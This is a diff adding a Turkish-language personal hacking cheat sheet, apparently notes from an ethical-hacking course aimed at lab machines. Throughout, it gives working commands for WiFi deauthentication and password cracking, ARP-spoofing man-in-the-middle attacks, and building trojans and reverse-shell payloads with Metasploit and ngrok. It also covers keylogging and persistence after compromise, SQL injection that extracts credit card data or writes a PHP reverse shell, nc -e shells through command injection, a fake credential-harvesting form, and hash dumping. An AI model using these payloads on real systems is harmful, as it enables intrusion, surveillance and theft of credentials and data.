@@ -1,0 +1,255 @@
+Win şifre:Passw0rd!
+Türkçe klavye:setxkbmap tr
+Gizli Dosya göster:ls -la
+Yolu göster:pwd
+Dizini aç:cd "dosyaadı"
+Dizinden çık: cd..
+Klasör oluştur:mkdir "dosyaadı"
+Temizle:clear
+Sil:rm "dosyaadı"
+Güncelle:apt-get update 
+Güncellemyi kur:apt-get upgrade
+Yükle:apt-get install "isim"
+şifre değiştir:passwd
+Root olma:sudo su
+Dosya yazilabilir yap=chattr -i
+Local ip:ifconfig
+yazılabilir yap dosyayı:chattr -i "dosya adı"
+Site ip:ping "link"
+Çıkart.unzip "isim"
+int rest:service network-manager restart
+Dns:leafpad /etc/resolv.conf
+Google DNS:8.8.8.8
+https://www.whatismyip.net/
+Vpn:openvpn "isim"
+https://dnsleaktest.com/
+Çalıştırma:./"isim"
+Mac kapama:ifconfig wlan0 down
+Mac değiştirme:macchanger --random wlan0
+Mac açma:ifconfig wlan0 up
+Monitör mod aç:airmon-ng start wlan0
+Monitör mod kapa:airmon-ng stop wlan0mon
+Ağ kontrol:iwconfig
+Ağ veri akışı:airodump-ng wlan0mon
+Özel veri akışı:airodump-ng --channel "kanal" --bssid "bssid" --write "ad" wlan0mon
+Düşürme saldırısı:aireplay-ng --deauth 10 -a 3C:FA:43:61:F4:7C"saldırcağımız bssid" -c C8:3C:85:5B:56:FD"saldırcağımız station" wlan0mon
+Wep kırma:aircrack-ng "dosya adı"
+Sahte yetkilendirme(wep):aireplay-ng --fakeauth 0 -a 3C:FA:43:61:F4:7C -h 74:ea:3a:93:a2:f2 "kendi mac adresin" wlan0mon
+Mac 2:ip addr
+Paket gönder(Wep):aireplay-ng --arpreplay -b 3C:FA:43:61:F4:7C -h 74:ea:3a:93:a2:f2 "kendi mac adresin" wlan0mon
+Şifre word:crunch "min" "max" "harfler" -o "isim"
+Şifre dene:aircrack-ng testo-01.cap"handshake" -w testword"word" 
+İnt keşfi:netdiscover -r "ip"0/24
+İnt keşfi:nmap "ip"0/24
+MİM:arpspoof -i eth0 -t 10.0.2.15"target" 10.0.2.1"router"
+MİM:arpspoof -i eth0 -t 10.0.2.1"router" 10.0.2.15"target"
+Saldırı algılama:(windows)arp -a
+İp forward:echo 1 > /proc/sys/net/ipv4/ip_forward
+Mim çalıştırma:python mitmf.py"ad" -i eth0 --arp --spoof --gateway 10.0.2.1"router" --target 10.0.2.15"hedef"
+Sunucu açma:service apache2 start
+Dns saldırı(önce /root/Downloads/MITMf-master/config/mitmf.conf yönlendir):python mitmf.py"ad" -i eth0 --arp --spoof --gateway 10.0.2.1"router" --target 10.0.2.15"hedef" --dns
+Bettercap:bettercap -iface eth0
+Bettercap göster:net.show
+Bettercap değer değiştirme örn:set arp.spoof.fullduplex true
+Bettercap hedef seçme:set arp.spoof.targets 10.0.2.15 
+Bettercap saldır:arp.spoof on
+Bettercap girilenleri göster:net.sniff on
+Fake yönlendirme:hstshijack/hstshijack
+Exploit Menüsü:msfconsole
+Exploit kullan:use "açık adı"
+Exploit ayarlar:show options
+Exploit target:set RHOSTS "ip"
+Exploit port:set RPORT "port"
+Exploit:exploit -j -z
+nmap:nmap "ip" -sV(Verisoyn tarar) -sT(Tcp tarar) -T3(Zaman) -O(İşletim sistemi) -p-(Tüm portları tara)
+Session bak:sessions -l4
+Session seç:session 1
+Smtp-user-enum kullanma:smtp-user-enum -M VRFY -U "common kullanıcı adları yolu" -t "ip"
+ssh giriş:ssh "admin isim"@"ip"
+BAĞLANTI ALMA VERME:nc -nvlp "port" 
+Arkaya at : background
+Ben kimim:whoami
+Sistem adı:uname -a 
+Veil açma:python3 Veil.py  
+Veil tool list:list
+Veil tool seçme: use "sayı"
+Veil LHOST Değiştirme:set LHOST 10.0.2.10"kendi ip"
+Veil LPORT Değiştirme:set LPORT 8080
+Veil opsiyonel:set PROCESSORS 1 
+set SLEEP 4
+Veil yap:generate
+Trojan dinleme (Msfconsole içine):use exploit/multi/handler
+TROJAN Ayarlar:set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 10.0.2.10"kendi ip"
+Dinle:exploit
+Pip çalışmazsa:python3 -m venv .venv
+JPG to ico:https://www.icoconverter.com/
+Exe açma:wine "exe adı"
+Github dosya indirme:git clone "github link"
+Resim+trojan(ilk önce resmi /opt/TrojanFactory/icons/ at ve adını generic yap):python3 trojan_factory.py -f http://10.0.2.10/backdoors/kedi.jpg"jpg" -e http://10.0.2.10/backdoors/kedi.exe"trojan" -o /opt/TrojanFactory/newtest.exe -i http://10.0.2.10/backdoors/kedi.ico"ikon"
+Arkaplanda dinleme:exploit -j -z
+Uzantı değiştirme(characters right-to):dosya adını gpj.exe yap
+Session göster:session -l
+Beef çalıştır:./beef
+Beef hook kodu:<script src="http://10.0.2.10:3000/hook.js"></script>
+Beef custom(targetı değiştir):/usr/share/bettercap/caplets/beefcustom/
+ÖNEMLİ:echo 1 > /proc/sys/net/ipv4/ip_forward
+Caplet çalıştırma:bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap
+web site test:https://www.000webhost.com/
+Ngrok çalıştırma (sitedeki token):./ngrok authtoken 1k13vMUjNZ1Gds40847lFOB9n1L_5aX8eCHcGh5CJGXcKYiB1
+Ngrok:./ngrok tcp "port"
+Msfvenom:msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io  lport=14072"port" -f exe -o /root/nea.exe
+Çalıştırma:msfconsole herşey aynı ama set LHOST 0.0.0.0 ve set LPORT 4242"port" windows/meterpreter/reverse_tcp
+Veil ile dinleme:HERŞEY AYNI sadece set LHOST 0.tcp.ngrok.io set LPORT 19461 
+web site beleş hosting:https://www.digitalocean.com/
+web site ssh bağlanma:ssh root"ad"@134.122.53.44"ip"
+domain:noip.com
+HACKLEDİKTEN SONRA:
+neyi hackledim:sysinfo
+çıkmadan geri dön:background
+çalışan programlar gör:ps
+servisi göç ettir:migrate 2824"id"
+ss almak:screenshot
+keyloger:keyscan_start
+keyloger kaydettiğini alma: keyscan_dump
+bağlantıyı sağlamlaştırma(msfconsole):
+use exploit/windows/local/presistence
+set EXE_NAME "isim".exe
+set SESSION "SES ID"
+show advanced
+set EXE::Custom "internet virus yolu"
+exploit
+siteinceleme:https://sitereport.netcraft.com/?url=
+reverse ip:https://www.yougetsignal.com/tools/web-sites-on-web-server/
+gizli dosya bul sitede: dirb "ip"
+subdomain bulma:python3 subbrute.py "web sitesi"
+form tarzı bozma:10.0.2.4; ls
+reverse shell:(msfconsole ile dinle) 10.0.2.4; (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)php -r '$sock=fsockopen("10.0.2.4",5050);exec("/bin/sh -i <&3 >&3 2>&3");'
+NETCAT ile dinle:nc -vv -l -p 5050 
+foto upload sömüürme:weevely genrate "şifre" "yolu"
+bağlan:weevely http://10.0.2.6/dvwa/hackable/uploads/con.php"url " "şifre" 
+file inclusion:(url eğer ?page= ise dosyalara bak)
+xss reflect:<script>alert(" hack you")</script>
+sql deneme:https://sqliteonline.com/
+sql bak:SELECT * FROM demo;
+sql ekle: INSERT INTO demo (id, name, hint) VALUES (28, "anan", "agabe");
+sql oluştur tablo: CREATE TABLE IF NOT EXISTS aa (id INTEGER PRIMARY KEY, name VARCHAR, age INTEGER);
+sql sil:DELETE FROM demo where name="anan"
+sql update: UPDATE demo SET id = 31 WHERE name = "ali";
+sql birleştir(aynı sütun olsun): SELECT * FROM "1. table" UNION SELECT * FROM "2. table";
+sql tahmin yolu ile data çekme(sütunu değiştir):  SELECT * FROM "1. table" UNION SELECT id, name, 3, 4 FROM "2. table";
+mysql:mysql -u root -h 10.0.2.7 --skip-ssl
+mysql database:show databases;
+kullan sql:use "isim";
+table bak:show tables;
+seç:select * from "isim";
+password sql:(password'e ' koy)SELECT * FROM accounts WHERE username='admin' AND password='111' OR 1=1#'(password e yaz: 111' OR 1=1#)(Eğer client side kontrol varsa burpsuite ile param değiştirerek gönder)
+username sql:SELECT * FROM accounts WHERE username='admin'# AND password='111'(username e yaz: admin'#)
+username sql(union lı column değştir):(username: admin' union select 1, 2, 3, 4, 5#)
+url sql:(url ye:admin'%23)
+USERNAME SQL:admin' OR 1=1;#
+username sql(information schema lı)(3 4 ü null olarak değiştirebilirsin):(username: admin' union select 1, table_name, 3, 4, 5 from information_schema.tables#)
+username sql(information schema lı FİLTRELİ,)(3 4 ü null olarak değiştirebilirsin):(username: admin' union select 1, table_name, 3, 4, 5 from information_schema.tables where table_schema = 'owasp10'#)
+username sql(sütun almak):admin' union select 1, column_name, 3, 4, 5 from information_schema.columns where table_name = 'credit_cards'#
+username sql(veri almak):admin' union select 1, ccnumber, ccv, expiration, 5 from credit_cards#
+username sql(hex kodu ile):admin' union select 1, table_name from information_schema.tables where table_schema =0x64767761#
+username sql (dosya okumalı)(1 yerine null koyabilirsin):admin' union select 1, load_file('/etc/passwd')#
+username sql (dosya yazma): admin' union select 1, 'test' into outfile '/tmp/test.txt'#
+username sql (reverse shell kaydet):admin' union select 1, '<?passthru("nc 10.0.2.4 1234 -e /bin/sh");?>' into outfile '/tmp/myshell.php'#
+union metodu:SELECT * FROM accounts WHERE username='admin' UNION SELECT * FROM accounts # AND password='111'(10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' union select * from accounts%23&password=password&user-info-php-submit-button=View+Account+Details)
+kaç table var:SELECT * FROM accounts WHERE username='admin' ORDER BY 1# AND password='111'(10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' order by 1%23&password=password&user-info-php-submit-button=View+Account+Details)
+table alma:SELECT * FROM accounts WHERE username='admin' UNION SELECT 1, 2, 3, 4, 5"table sayısı kadar"# AND password='111'(10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' order by 1%23&password=password&user-info-php-submit-button=View+Account+Details)
+data çekme(username de yazabalirsin: admin' union select 1, database(), user(), version(),5#)(yukardakinde yazılabilcek değerleri gir):10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' union select 1, database(), user(), version(), 5%23&password=password&user-info-php-submit-button=View+Account+Details
+table çekme:10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' union select 1, table_name, null, null, 5 from information_schema.tables%23&password=password&user-info-php-submit-button=View+Account+Details
+table çekme(filtreli):10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' union select 1, table_name, null, null, 5 from information_schema.tables where table_schema = 'owasp10'%23&password=password&user-info-php-submit-button=View+Account+Details
+sütun çekme:10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' union select 1, column_name, null, null, 5 from information_schema.columns where table_name = 'accounts'%23&password=password&user-info-php-submit-button=View+Account+Details
+account çekme: 10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin' union select 1, username, password, is_admin, 5 from accounts%23&password=password&user-info-php-submit-button=View+Account+Details
+sql map=sqlmap -u ""url(giriş formlu)""
+sql map database=sqlmap -u ""url(giriş formlu)"" --dbs
+sql map current dbs:sqlmap -u "http://10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin&password=1111&user-info-php-submit-button=View+Account+Details" --current-db   
+table bul:sqlmap -u "http://10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin&password=1111&user-info-php-submit-button=View+Account+Details" --tables -D owasp10"dbs yaz"
+sütun bul:sqlmap -u "http://10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin&password=1111&user-info-php-submit-button=View+Account+Details" --columns -T credit_cards -D owasp10
+tüm data alma:sqlmap -u "http://10.0.2.6/mutillidae/index.php?page=user-info.php&username=admin&password=1111&user-info-php-submit-button=View+Account+Details" -T credit_cards -D owasp10 --dump
+html injection(script çalıştırma): <h1>Hiii, <script>alert(1)</script>!</h1>
+html injection(iframe):<iframe src="https://assets.audiomack.com/lgbtqmingenius/2c50fb6429e5554d8de1fdbf230084e6b42c73b7df07eaecd6ab7dbb4311c593.jpeg?width=1000&height=1000&max=true"></iframe>
+html injection(iframe dinle):nc -nvlp 1234
+html injection(iframe):<iframe src="http://10.0.2.4:1234/test" height="0" width="0"></iframe>
+html injection(fake form saldırısı önce dinle):
+<form name="login" action="http://10.0.2.4:1234/text.html">
+	<table>
+		<tr><td>Username:</td><td><input type="text" name="username" placeholder="username"></td></tr>
+		<tr><td>Password:</td><td><input type="password" name="password" placeholder="password"></td></tr>
+	</table>
+	<input type="submit" value="login">
+ </form>
+sitede dirbuster ile sayfaları bulma:(directory-list-2.3-medium.txt kullan)
+iframe inj(get):GET /bWAPP/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250"></iframe><h1>hi<h1> HTTP/1.1
+php code inj(url):10.0.2.7/bWAPP/phpi.php?message=test;system("cat /etc/passwd")
+php code inj ile kendine bağla(nc -nvlp 1234):10.0.2.7/bWAPP/phpi.php?message=test;system("nc 10.0.2.4 1234 -e /bin/bash")
+php code inj ile shell açma(nc ile bağlandıktan sonra):python -c 'import pty; pty.spawn("/bin/bash")'  
+unrestricted file açığı(wee ile php oluştur upload et linkini al): 
+weevely generate "şifre" mywe.php
+weevely http://10.0.2.7/bWAPP/images/mywe.php "şifre"
+unrestricted file açığı(daha zor): cp mywe.php mywe.php3 
+os command inj(önce nc ile dinle):www.google.com; nc 10.0.2.4 1234 -e /bin/bash
+os command inj(orta için &| dene):www.nsa.gov|pwd
+os command inj(oto):commix --url="http://10.0.2.7/bWAPP/commandi.php" --cookie="security_level=0; PHPSESSID=f25e268edc9877c9eacea2ebf9dcd4ab" --data="target=www.nsa.gov&form=submit"
+server side includes inj(önce dinle):<!--#exec cmd="nc  10.0.2.4 1234 -e /bin/bash"-->  (kullanıcı adı yerine yaz)
+directory traversal açığı(gerektiği kadar geri git):http://10.0.2.7/bWAPP/directory_traversal_1.php?page=../../../etc/passwd
+directory traversal açığı(oto, -S koy eğer https): dotdotpwn -m http -h 10.0.2.7/bWAPP/directory_traversal_1.php?page=message.txt
+xss açığı(kullanıcı adına yaz <IMG SRC=jAVasCrIPt:alert('XSS')> değişik şeyler dene):<script>alert("123");</script>
+xss açığı :<img src=a onerror=alert(1)>
+csrf açığı(kendi serverında çapırma kodu): <img style="display:none", src="http://10.0.2.6/dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change", alt=""> 
+bruteforce(burpsuite intruder):iki tane varsa clusterbomb 1 taneyse sniper
+site tarama bozdozlama(vpn kullan):nikto -h "url"
+dom xss açığı(clientta çalıştırıldığı için adı dom)(search a yazabilirsin):<iframe src="javascript:alert(`xss`)">
+token decode: https://jwt.io/
+hash neyin hash i:hash-identifier 
+xxe açığı:
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+ssrf açığı(linke koy):http://localhost/admin/
+ssrf açığı ile sil(yönlendirme url'sine koy):http://localhost/admin/delete?username=carlos
+ssrf açığı ile ana servera eriş(burpsuite ile intuder ile)(değişçek yere § koy):http://192.168.0.§1§:8080/admin
+ssrf açığı ile sil(yönlendirme url'sine koy)(kara listeli):http://127.1/%25%36%31dmin/delete?username=carlos
+ssrf açığı ile sil(yönlendirme url'sine koy)(beyaz listeli)(@ veya # dene):http://localhost:80%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
+kim hangi port kullanıyo(80 portu): lsof -i :80
+port öldür: kill "pid"
+CORS açığı:(Origin:"url")
+broken object authorization:(normal kullanıcının tüm kullanıcalara post aracılığı ile ulaşabilmesi)
+excessive data exposure:(gereksiz attribute leri göndermesi)
+mass assigment:(post metodunda fazladan veri gönderiebilmek )
+Improper Assets Management:(farklı versiyon api ile saldırabilme)
+firewall bulma: wafw00f "url"
+çok kişi giriyosa siteye:lbd "url" 
+wordpress için: wpscan
+
+hackledikten sonra hash alma(msfconsole): run post/linux/gather/hashdump 
+hackledikten sonra hash alma(msfconsole): hashdump
+hackledikten sonra hash alma(win):reg save HKLM\sam ./sam.save
+hackledikten sonra hash alma(win):reg save HKLM\system ./system.save
+hackledikten sonra hash alma(win):impacket-secretsdump -sam sam.save -system system.save LOCAL
+manuel hash:unshadow etc/passwd etc/shadow
+hashcat : hashcat --help | grep "arican şey"
+hashcat kır: hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt 
+daha önceden kırılıysa: hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt --show
+daha önceden kırılıysa ve yine kırcaksan: hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt --potfile-disable
+zip kırma has alma dosya olarak: zip2john mysecret.zip | cut -d ':' -f 2 > myzip.txt
+zip hash kırma(11600-7zip 13600-winzip):hashcat -m 13600 mysecret.zip /usr/share/wordlists/fasttrack.txt
+
+NOTLAR:Inspector, Debugger, Storage, Network
+
+test1:https://vulnhub.com/
+test2:https://tryhackme.com/
+wordlistleri:https://weakpass.com/wordlist/1948
+açık data arama:https://osintframework.com/
+detaylı site:https://builtwith.com/
+test3:https://www.hackthebox.com/
+bugbounty:hackerone.com
+bugbounty:bugcrowd.com
+bugbounty:intigriti.com
+rapor:pentestreports.com
